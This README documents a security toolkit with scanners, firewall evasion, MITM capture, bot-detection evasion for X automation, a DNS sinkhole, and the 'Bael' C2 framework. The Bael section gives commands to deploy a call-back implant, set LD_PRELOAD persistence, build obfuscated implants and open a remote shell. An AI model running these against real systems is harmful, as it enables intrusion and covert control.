![Python 3.10+](https://img.shields.io/badge/Python-3.10+-blue.svg)
![Version](https://img.shields.io/badge/version-0.1.0-brightgreen)
![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)
![Category](https://img.shields.io/badge/Category-Network%20Analysis-blue)
![Cybersecurity Research](https://img.shields.io/badge/Security-Research-magenta)
![Framework](https://img.shields.io/badge/Framework-Integrated_Security_Suite-brightgreen)

# Malum: Integrated Security Research & Orchestration Suite

## Overview

<p align="center">
Malum is a comprehensive suite of security tools designed for advanced network analysis, behavioral emulation, and deterministic resolution auditing. The framework provides security professionals with high-fidelity environments for validating security controls, analyzing network traffic, and simulating complex user-agent interactions.
</p>

---

## Global Index
- [Andras](#andras)
    - [About Andras](#about-andras)
    - [Notices](#andras-notices)
    - [Usage](#andras-usage)
- [Nephila](#nephila)
    - [About Nephila](#about-nehphila)
    - [Notices](#nephila-notices)
    - [Usage](#nephila-usage)
- [Amon](#amon)
    - [About Amon](#about-amon)
    - [Notices](#amon-notices)
    - [Usage](#amon-usage)
- [Bael](#Bael)
    - [About Bael](#about-bael)
    - [Notices](#bael-notices)
    - [Usage](#bael-usage)

## Setup & Installation

1.  **Clone the repository:**
    ```sh
    git clone https://github.com/J4ck3LSyN-Gen2/Malum.git
    cd malum
    ```

2.  **Create a virtual environment (recommended):**
    ```sh
    python3 -m venv malumEnviron
    source manumEnviron/bin/activate
    # On Windows(powershell), use:  .\malumEnviron\Scripts\Activate.ps1
    ```

3.  **Install dependencies:**
    A `requirements.txt` file should be created containing the following:
    ```
    scapy
    fake_useragent
    colorama
    alive_progress
    dnspython
    beautifulSoup4
    urljoin
    selenium
    beautifulsoup4
    requests
    httpx
    PyYAML
    cryptography
    sys_platform == 'win32'
    ```
    Install them using pip:
    ```sh
    python3 -m pip install -r requirements.txt
    ```

4. **Deactivation:**

    ```sh
    deactivate malumEnviron
    ```
---

## Andras

### About Andras

**Andras** is an advanced browser automation and behavioral emulation framework. It leverages Selenium to provide a robust, scriptable interface for modern web applications, focusing on high-fidelity user interaction and advanced session management.

---

### Core Technical Capabilities

*   **Advanced Browser Control**: Programmatically start, stop, and configure browsers (Chrome, Firefox) with support for headless mode, proxies, and custom window sizes.
*   **Human Emulation (`ActHuman`)**: Evade bot detection with built-in methods for human-like typing (with typos), mouse movements, clicking, and scrolling.
*   **Stealth & Evasion**: Features include stealth mode for Chrome to hide automation flags, extensive user-agent management with randomization and remote fetching, and proxy support.
*   **X/Twitter Interaction (`XInteract`)**: A dedicated module to automate X, including secure login (with 2FA support), posting tweets (with media), searching for posts, and exporting rich data to JSON or CSV.
*   **DuckDuckGo Interaction (`DuckInteract`)**: Automate searches on DuckDuckGo and interact with its AI Chat, enabling multi-turn conversations and dork construction.
*   **Interactive Console**: Launch a powerful REPL-style console to control an active browser session in real-time, allowing for dynamic element finding, JavaScript execution, and interaction.
*   **Mouse Event Recording & Playback**: Capture and replay mouse movements, clicks, and other events to replicate user interactions.
*   **Built-in Caching**: A simple yet effective file-based caching system to store and retrieve data like user-agent lists, reducing redundant network requests.

---

### Andras Index

- [About Andras](#about-andras)
  - [Core Features](#andras-core-features)
- [notices](#andras-notices)
- [Usage](#andras-usage)
  - [Command-Line Interface (CLI)](#andras-command-line-interface-cli)
    - [X/Twitter Interaction](#andras-xtwitter-interaction)
    - [DuckDuckGo Interaction](#andras-duckduckgo-interaction)
    - [DuckDuckGo Pythonic](#andras-duckduckgo-interaction-pythonic)
    - [Interactive Console](#andras-interactive-console)

---

### Andras Notices

*   **Authorized Use Only**: This framework is designed for security research and automated testing within authorized environments. Users must ensure compliance with target website Terms of Service and local regulations.
*   **Behavioral Throttling**: When simulating interactions on production platforms, utilize the `ActHuman` module to maintain realistic interaction rates and avoid triggering automated rate-limiting.
*   **Browser Installation**: Andras requires the target browser (e.g., Chrome, Firefox) and its corresponding WebDriver to be installed on the system.

---

### Andras Usage

Andras can be run as a standalone CLI tool or imported as a library into your own Python projects.

#### Andras Command-Line Interface (CLI)

The CLI provides a quick way to perform common tasks.

```sh
python3 andras.py [options]
```

##### Andras X/Twitter Interaction

```sh
# Log in to X/Twitter (will prompt for password if not provided)
python3 andras.py --x-login <username>

# Search for posts containing "cybersecurity" and export to a JSON file
python3 andras.py --x-search "cybersecurity" "threat intelligence" --x-export results.json

# Post a tweet with a media file
python3 andras.py --x-post "Automated post from Andras" --x-post-media /path/to/image.png
```

##### Andras DuckDuckGo Interaction

```sh
# Search DuckDuckGo for a query
python3 andras.py --ddg-search "what is the solomonic demon andras"

# Interact with DuckDuckGo's AI Chat
python3 andras.py --ddg-chat "Write a python script to list files in a directory"
```

##### Andras Interactive Console

Launch a browser and attach an interactive console to control it live.

```sh
python3 andras.py -u https://google.com -c
```

#### Andras as a Python Library

Import `Andras` to integrate its powerful automation capabilities into your own scripts.

##### Andras Basic Browser Control (Pythonic)

```python
from andras import Andras
import time

# Initialize Andras (this does not start the browser)
ai = Andras()
# Start the browser instance
ai.browserInstance.start(browser='chrome', headless=False)
# Navigate to a URL
ai.browserInstance.navigateTo('https://book.hacktricks.xyz/')
time.sleep(5) # Wait for 5 seconds
# Take a screenshot
ai.browserInstance.screenshot('hacktricks.png')
# Stop the browser
ai.browserInstance.stop()
```

##### Andras X/Twitter Interaction (Pythonic)

```python
from andras import Andras
from getpass import getpass

ai = Andras()

# Start a non-headless browser for login
ai.browserInstance.start(headless=False)

# Login to X
username = "your_x_username"
password = getpass("Enter your X password: ")
ai.xInteractInstance.login(username, password)

# Search for posts
results = ai.xInteractInstance.searchPosts(keywords=["OSINT", "redteam"], maxResults=20)

# Export results
ai.xInteractInstance.exportResults("osint_search.json")

ai.browserInstance.stop()
```

##### Andras DuckDuckGo Interaction (Pythonic)

```python
from andras import Andras

ai = Andras()
ai.browserInstance.start(headless=True) # Can be headless

# Perform a search
search_results = ai.duckInteractInstance.search("powershell amsi bypass", pages=2)
print(f"Found {len(search_results)} search results.")

# Have a conversation with DuckDuckGo AI
prompt = "Explain the difference between a SYN scan and a TCP Connect scan."
response = ai.duckInteractInstance.duckChat(prompt)

if response['success']:
    print("--- AI Response ---")
    print(response['response'])

ai.browserInstance.stop()
```

## Nephila

### About Nephila

<p align="center">
  <img src="imgs/nephilaUsage.png">
</p>

---

**Nephila** is a modernized, multi-faceted tool designed for information gathering, network analysis, and security operations. It provides a suite of modules for tasks ranging from proxy management and port scanning to sophisticated firewall evasion and man-in-the-middle traffic capture. This tool is built to be an executable CLI or can be used pythonically.

---

### Nephilas Core Features

*   **Advanced Proxy Manager (`proxify`)**: Fetch, verify, score, and manage pools of HTTP, HTTPS, SOCKS4, and SOCKS5 proxies. Includes features like round-robin rotation, latency filtering, and health checks.
*   **Firewall Evasion (`firewallFrag`)**: Craft and send fragmented IP packets with randomized payloads and timing to test and bypass firewall and IDS/IPS systems.
*   **Port Scanner (`baseScanner`)**: Perform various stealth scans, including SYN, FIN, XMAS, and NULL scans, as well as standard TCP connect scans with decoy support.
*   **DNS Enumeration (`enumeration`)**: Conduct DNS reconnaissance, including A, MX, NS, and TXT lookups, reverse DNS queries, zone transfers, and subdomain enumeration.
*   **MITM Traffic Capture (`mitmCapture`)**: Capture network traffic on a specified interface, apply BPF filters, and dynamically redirect packets based on user-defined rules.
*   **Nmap Scanner (`nmap`)**: Run nmap scans on target hosts, providing a comprehensive report of open ports, services, and more.

---

## Nephila Index
- [About Nephila](#about-nehphila)
  - [Core Features](#nephilas-core-features)
- [Credits](#credits)
- [Notices](#nephila-notices)
- [Setup & Installation](#setup--installation)
- [Usage](#nephila-usage)
  - [Command-Line Interface (CLI)](#nephila-command-line-interface-cli)
    - [Proxy Manager (`proxy`)](#nephila-proxy-manager)
    - [Port Scanner (`scan`)](#nephila-port-scanner)
    - [Firewall Evasive Packet Fragmentation (`firewall-frag`)](#nephila-firewall-fragmentation)
    - [DNS Enumeration](#nephila-dns-enumeration)
    - [MITM Capture](#nephila-mitm-capture)
    - [nmap Scanner](#nephila-nmap-scanner)
  - [Python Library](#nephila-as-a-python-library)
    - [Proxy Manager (`proxify`)](#nephila-proxy-manager-pythonic)
    - [Port Scanner (`baseScanner`)](#nephila-port-scanner-pythonic)
    - [Firewall Evasive Packet Fragmentation (`firewallFrag`)](#nephilas-send-fragmented-packet-funcitonality-pythonic)
    - [nmap Scanner](#nephila-nmap-pythonic)
---

## Nephila Notices

*  **Privileged Execution**: Low-level packet manipulation and interface monitoring modules (e.g., `firewall-frag`, `mitm-capture`) require root/administrator privileges. Use the `--no-admin` flag to run Nephila in a restricted mode.
*  **Security Auditing**: This suite is intended for professional security assessments. Unauthorized network analysis or traffic interception is strictly prohibited.
*  **Dependencies**: The script depends on several third-party libraries, including `scapy` for packet manipulation and `dnspython` for DNS queries. The script will attempt to prompt for installation if `scapy` is missing. It is recommended to install all dependencies from `requirements.txt`.

---

## Nephila Usage

Nephila can be run directly from the command line or imported as a module into your own Python scripts.

### Nephila Command-Line Interface (CLI)

The primary way to use Nephila is through its command-line interface. The general syntax is:

```sh
python3 nephila.py [mode] [options]
```

You can get help for any mode by using the `-h` flag:

```sh
python3 nephila.py <mode> -h
```

#### Nephila Proxy Manager

The `proxy` mode allows you to manage and utilize a pool of proxies.

**Actions:**
*   `fetch`: Fetch and verify new proxies from public sources.
*   `list`: List all currently stored proxies.
*   `health`: Perform a health check on stored proxies.
*   `stats`: Get statistics about the proxy pool.
*   `get`: Get a single proxy based on a selection strategy.
*   `export`: Export proxies to a file.
*   `import`: Import proxies from a file.
*   `clear`: Clear all stored proxies.

**Example: Fetch 20 HTTP proxies and get the best one.**
```sh
# Fetch and verify proxies
python3 nephila.py proxy -a fetch -t http -l 20 --verbose

# Get the best proxy from the fetched list
python3 nephila.py proxy -a get --strategy best
```

**Example: Import proxies from a file and verify them.**
```sh
python3 nephila.py proxy -a import --file my_proxies.txt --verify
```

#### Nephila Port Scanner 

The `scan` mode performs various types of port scans on a target host. **Requires root/admin privileges** (except for `connect` scan).

**Scan Types:**
*   `syn` (default): TCP SYN scan (stealthy).
*   `connect`: Standard TCP connect scan.
*   `fin`: TCP FIN scan.
*   `xmas`: TCP "XMAS" scan (flags FIN, PSH, URG).
*   `null`: TCP "Null" scan (no flags set).

**Example: Perform a SYN scan on the top 1024 ports of a host.**
```sh
sudo python3 nephila.py scan 192.168.1.1 "1-1024" -s syn -T 150
```

**Example: Perform a connect scan with decoy IPs.**
```sh
python3 nephila.py scan example.com "80,443" -s connect -d 8.8.8.8 1.1.1.1
```

#### Nephila Firewall Fragmentation 

The `firewall-frag` mode sends fragmented IP packets to a target to test firewall rules. **Requires root/admin privileges.**

**Example: Send fragmented packets to a web server on port 80.**
```sh
sudo python3 nephila.py firewall-frag example.com 80 --min-frag-size 8 --max-frag-size 16 --min-delay 0.2 --max-delay 1.0 -v
```

#### Nephila DNS Enumeration 

The `enum` mode performs various DNS reconnaissance tasks.

**Enum Types:**
*   `full-enum` (default): Performs A, MX, NS, TXT, and subdomain lookups.
*   `dns-a`, `dns-mx`, `dns-ns`, `dns-txt`: Query for specific record types.
*   `reverse`: Perform a reverse DNS lookup on an IP.
*   `zone-transfer`: Attempt a DNS zone transfer.
*   `subdomain-enum`: Enumerate subdomains using a wordlist.

**Example: Perform a full enumeration on a domain.**
```sh
python3 nephila.py enum example.com
```

**Example: Attempt a zone transfer using a specific nameserver.**
```sh
python3 nephila.py enum example.com -t zone-transfer --nameserver ns1.example.com
```

**Example: Enumerate subdomains with a custom wordlist.**
```sh
python3 nephila.py enum example.com -t subdomain-enum -w /path/to/subdomains.txt
```

#### Nephila MITM Capture 

The `mitm-capture` mode captures and optionally redirects network traffic. **Requires root/admin privileges.**

**Example: Capture all TCP traffic on interface `eth0` and export to a file.**
```sh
# Press Ctrl+C to stop capturing
sudo python3 nephila.py mitm-capture -i eth0 -f "tcp" --export capture.json
```

**Example: Capture traffic and redirect requests from port 8080 to `example.com:80`.**
```sh
sudo python3 nephila.py mitm-capture -i wlan0 -r 192.168.1.100 8080 example.com 80
```

---

### Nephila as a Python Library

You can import and use Nephila's classes in your own Python scripts for more complex and customized workflows.

```python
import asyncio
from nephila import nephila

# Initialize the main class
n = nephila()
```

#### Nephila Proxy Manager Pythonic

The `proxify` class provides powerful proxy management capabilities.

```python
async def proxy_example():
    # Initialize the proxy manager
    proxy_manager = n.proxify(n)
    # Fetch and verify 20 HTTP proxies
    print("Fetching proxies...")
    verified_proxies = await proxy_manager.fetchAndVerify(limit=20, proxyType='http')
    print(f"Found {len(verified_proxies)} verified proxies.")
    if not verified_proxies:
        return
    # Get the best proxy based on score
    best_proxy_info = proxy_manager.getProxy(proxyType='http', strategy='best')
    if best_proxy_info:
        print(f"Best proxy: {best_proxy_info['proxy']} (Score: {best_proxy_info['score']})")
    # Get a random proxy
    random_proxy = proxy_manager.getRandomProxy()
    print(f"Random proxy: {random_proxy}")
    # Rotate through proxies
    print("Rotating proxies:")
    for _ in range(5):
        print(f"  - {proxy_manager.rotateProxy()}")

if __name__ == "__main__":
    asyncio.run(proxy_example())
```

#### Nepihlas Port Scanner Pythonic

The `baseScanner` class can be used to programmatically run port scans. Remember that this requires root/admin privileges for stealth scans.

```python
# This example requires root/admin privileges

# Initialize the scanner
scanner = n.baseScanner(
    NSI=n,
    host='scanme.nmap.org',
    timeout=1.0,
    scanJitter=0.5
)

# Define ports to scan
ports_to_scan = [22, 80, 443, 8080]

# Run a SYN scan
print(f"Running SYN scan on {scanner.config['host']}...")
open_ports = scanner._scanPorts(ports_to_scan, maxThreads=10)

if open_ports:
    print("Scan results:")
    for port, status in open_ports.items():
        print(f"  Port {port}: {status}")
else:
    print("No open ports found.")

```

#### Nephilas Send Fragmented Packet Funcitonality Pythonic

Use the `firewallFrag` class to send fragmented packets. This also requires root/admin privileges.

```python
# This example requires root/admin privileges

# Initialize the fragmentation module
frag_sender = n.firewallFrag(n)

target_host = 'example.com'
target_port = 80

print(f"Sending fragmented packets to {target_host}:{target_port}...")

try:
    result = frag_sender.scan(
        rHost=target_host,
        rPort=target_port,
        minFragSize=8,
        maxFragSize=16,
        minInterFragDelay=0.5,
        maxInterFragDelay=2.0,
        verbose=True  # Will print details of each fragment
    )
    print(f"Fragmentation scan completed: {result['status']}")
except PermissionError as e:
    print(f"Error: {e}")

```

### Nephila NMAP Scanner

```sh
usage: nephila.py nmap [-h] [-p PORTS] [-a ARGS] [--su] [-v] [-o] targets

positional arguments:
  targets               Target hosts to scan, comma-separated.

options:
  -h, --help            show this help message and exit
  -p PORTS, --ports PORTS
                        Ports to scan (e.g., '80,443', '1-1000').
  -a ARGS, --args ARGS  Nmap arguments, colon-separated (e.g., 'sV:O:T4').
  --su                  Run nmap with sudo (for OS detection, etc.).
  -v, --verbose         Enable verbose output during scan.
  -o, --output          Write XML output to a file in the 'nmapScanOutput' directory.
```

### Nephila NMAP Pythonic

```python
# This example requires nmap to be installed on your system.
# Initialize the nmap scanner
nmapScanner = n.nmap(n)
# Configure it to write output files
nmapScanner.config['writeFile'] = True
print("Running Nmap scan...")
results = nmapScanner.scan(
    targets="scanme.nmap.org", # Can be [str,...] or seperated via host1,host2,...
    ports="22,80", # Can be [str,...] or seperated via port1,port2,... or ranged via 1-65535
    args="sV:A", # Service version and Aggressive scan options
    su=True, # Use sudo for more scan types (does nothing on windows)
    verbose=True # Verbosity
)
print(f"Nmap scan finished. Found {len(results['scans'][0]['hosts'])} host(s).")
```

## Amon

### About Amon

**Amon** is a deterministic DNS security gateway and resolution auditor. It serves as a tactical DNS sinkhole and proxying resolver designed for sophisticated telemetry filtering and anomaly detection.

---

By utilizing DNS over HTTPS (DoH) backends, real-time Shannon entropy analysis, and Linux Mount Namespaces (`unshare`), Amon provides a secure, isolated DNS resolution environment. This allows for the granular auditing of high-risk applications (e.g., browsers or data-intensive clients) without impacting system-wide network settings.

### Amon Notices

* **Security Auditing**: Amon is designed for authorized security research and defensive threat-hunting. Ensure adherence to organizational policies before redirecting application traffic.
* **Dependencies**: You will need `requests, dnslib, curl_cffi`

### Amon Usage

```markdown
usage: amon.py [-l LHOST] [-p PORT] [-h] [-v] [-d DOH] [--log-file LOGFILE] 
               [--log-dir LOGDIR] [--no-log] [--wrap ...]
```

#### Amon Command-Line Interface (CLI)

* **-l, --listen**
    - `IP` to bind the `DNS` listener to.
    - Default: `0.0.0.0`
* **-p, --port**
    - `PORT` to bind the `DNS` listener to.
    - Default: `53`
* **-v, --verbose**
    - Enable verbose output.
    - Default: `False`
* **-d, --doh**
    - Custom Upstream DoH Provider URL.
    - Default: `Cloudflare`
    - _NOTE:_ We are going to move to `http://1.1.1.1/dns-query`
* **--log-file**
    - Name of path of the log file.
    - Default: `amon_<timestamp>.log`
* **--log-dir**
    - Target directory for log outputs.
    - Default: `./.amonLogs/`
* **---no-log**
    - Disable local file logging enirely.
    - Disable local file logging entirely.
    - Default: `False`
* **--wrap `cmd`**
    - Wrap the following command inside custom mount namespace.
    - Default: `None`

#### Amon Operational Examples

1. Standard DNS Daemon Deployment (Root Required for Port 53)
    Start `Amon` to filter network-wide or system-wide queries:
    ```bash
    sudo python3 amon.py -l 127.0.0.1 -p 53  
    ```
2. Running on an Alternative Port (No Root Required)
    If you don't have superuser privileges, run on a high port (eg.,`8353`):
    ```bash
    python3 amon.py -l 127.0.0.1 -p 8353
    ```
3. Application Isolation via Mount Namespaces `--wrap`
    This is where amon excels for target auditing. To launch a specific application (e.g., firefox or a telemetry-heavy client script) so that only its DNS queries are handled, blocked, and monitored by your local amon server:
    1. _Terminal 1:_ Start the server on localhost:
        ```bash
        sudo python3 amon.py -l 127.0.0.1 -p 53
        ```
    2. _Terminal 2:_ Wrap your local program:
        ```bash
        python3 amon.py --wrap firefox
        ```

__How it works under the hood:__  
amon executes unshare -m to spawn a new shell with a private mount namespace. It copies your /etc/resolv.conf, comments out the normal nameservers, adds nameserver 127.0.0.1, bind-mounts this temporary configuration over /etc/resolv.conf within the namespace, and execs your target application. The host system's DNS remains untouched.


#### Amon Security Engine Details
__Gravity Blocklist__: n boot, Amon's gravity engine pulls known tracking, malicious, and advertising domains dynamically from verified sources:

* StevenBlack/hosts
* Hagezi Multi-Adblock

Matched queries immediately resolve to 0.0.0.0 with a TTL of 60 seconds, preventing any outbound connections to tracking or sinkholed telemetry domains.

#### Amon Shannon Entropy Detection
To detect anomalies like DNS Tunneling (e.g., Cobalt Strike, iodine) or data exfiltration over TXT/CNAME records, amon calculates the Shannon Entropy of every label in a requested domain:

<p align="center">
  <img src="imgs/amonEq0.png">
</p

If any single domain label exceeds an entropy score of `4.5` or exceeds __45 characters__ in length, Amon flags a high-severity warning in the log output:
`[!] SUSPICIOUS ENTROPY: Potential DNS Tunneling/Exfil in <domain>`

---

## Bael

---

### About Bael

**Bael** is a high-performance, secure Command & Control (C2) and post-assessment framework optimized for the Linux ecosystem. It facilitates resilient remote administration and security control validation through encrypted tunnels and advanced system call orchestration.

### Core Technical Capabilities

*   **Hardened Communications**: Enforces mandatory Mutual TLS (mTLS 1.3) with pinned certificates and ChaCha20-Poly1305 encryption for all C2 data transit.
*   **Network Pivoting**: Includes a diagnostic **SOCKS5 relay** (with authentication) and **TUN interface** bridging for full Layer 3 network encapsulation.
*   **Advanced System Monitoring**:
    *   **Environment Auditing**: Multi-stage detection for debuggers, virtualized environments (MAC/UUID), and containerized isolation (Cgroups/Namespaces).
    *   **Kernel Interception**: Implements a `SeccompNotif` supervisor utilizing `SECCOMP_IOCTL_NOTIF_ADDFD` to audit and redirect critical system calls in target processes.
    *   **Fileless Execution**: Employs `memfd_create` and `io_uring` patterns for high-performance, fileless process orchestration.
*   **Vulnerability Validation**:
    *   **Kernel Research Modules**: Automated validation modules for specific CVEs (e.g., page cache vulnerabilities) to assess system resilience.
*   **HiveMind Console**: A real-time REPL console for centralized management of distributed nodes.

### Bael Notices

*   **PKI Architecture**: Bael requires valid PKI assets for operation. Initialize the environment using the `keygen` mode to establish the secure identity layer.
*   **High-Privilege Operations**: Core features such as TUN bridging and Seccomp notification handling require administrative context.
*   **Research Focus**: This framework is intended for professional security research and control validation. Unauthorized deployment on third-party systems is strictly prohibited.

### Bael Usage

#### 1. Infrastructure Preparation (Keygen)
Generate the obfuscated PKI assets and the secret shield key:
```sh
python3 bael.py --mode keygen --kg-out .baelKeys --kg-priv 32
```

#### Starting the C2 Server (HiveMind)
Launch the listener and enter the interactive command console:
```sh
sudo python3 bael.py --mode server --lhost 0.0.0.0:443 --key "YOUR_PRIVATE_KEY"
```

#### Deploying the Implant (Client)
Connecting back to the C2 with SOCKS5 relay enabled:
```sh
python3 bael.py --mode tun --remote <C2_IP>:443 --socks --socks-user admin --socks-pass malum123
```

#### Persistence & Stealth (Root Context)
Trigger advanced persistence and LPE scanning:
```sh
sudo python3 bael.py --persist --ldpreload --scan-lpe
```

#### Polymorphic Building
Generate a unique, obfuscated variant of the Bael implant:
```sh
python3 bael.py --mode build --bl-name "sys-service-worker" --seed 1337
```

#### HiveMind Console Commands
Once connected, you can issue commands directly to the implant:
```text
bael> help
bael> whoami
bael> sysinfo
bael> exec:ls -la /root
bael> shell:10.0.0.5:9001
bael> /logging session_capture.log
```

## Credits



*   **Author**: J4ck3LSyN
*   **Version**: 0.1.0
*   **License**: MIT

---
[Back to the Top](#about)
